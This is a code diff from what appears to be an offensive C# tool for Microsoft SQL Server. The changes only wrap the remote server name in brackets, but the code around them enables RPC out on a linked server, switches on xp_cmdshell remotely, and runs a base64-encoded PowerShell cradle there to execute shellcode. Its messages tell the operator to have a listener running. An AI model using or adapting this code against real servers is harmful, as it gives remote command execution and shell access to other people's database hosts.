@@ -284,7 +284,7 @@ namespace SQL
                     Console.Write("\n[Q] Please enter remote SQL server name: ");
                     string server = Console.ReadLine();
                     Console.WriteLine("[+] Trying to enable RPC out using sp_serveroptions");
-                    string serveroption = "EXEC sp_serveroption '" + server + "', 'rpc out', 'true';";
+                    string serveroption = "EXEC sp_serveroption [" + server + "], 'rpc out', 'true';";
                     command = new SqlCommand(serveroption, con);
                     reader = command.ExecuteReader();
                     reader.Read();
@@ -292,12 +292,12 @@ namespace SQL
                     reader.Close();
 
                     Console.WriteLine("[+] Enabling xp_cmdshell options");
-                    string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + server;
+                    string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + server + "]";
                     command = new SqlCommand(enableoption, con);
                     reader = command.ExecuteReader();
                     reader.Close();
                     Console.WriteLine("[+] Enabling xp_cmdshell procedure");
-                    string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + server;
+                    string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + server + "]";
                     command = new SqlCommand(enablexpcmdshell, con);
                     reader = command.ExecuteReader();
                     reader.Close();
@@ -310,7 +310,7 @@ namespace SQL
                     var psCommandBase64 = Convert.ToBase64String(psCommandBytes);                   
 
 
-                    string shellcodecmd = "EXEC ('xp_cmdshell ''powershell -enc " + psCommandBase64 + "'';') AT " + server;                   
+                    string shellcodecmd = "EXEC ('xp_cmdshell ''powershell -enc " + psCommandBase64 + "'';') AT [" + server + "]";                   
                     Console.WriteLine("[+] Executing Shellcode on " + server + " .Please make sure listener is running");
                     Console.WriteLine("\n[+] Your PS cradle: " + code);
                     Console.WriteLine("[+] Whole xp_cmdshell command: " + shellcodecmd);
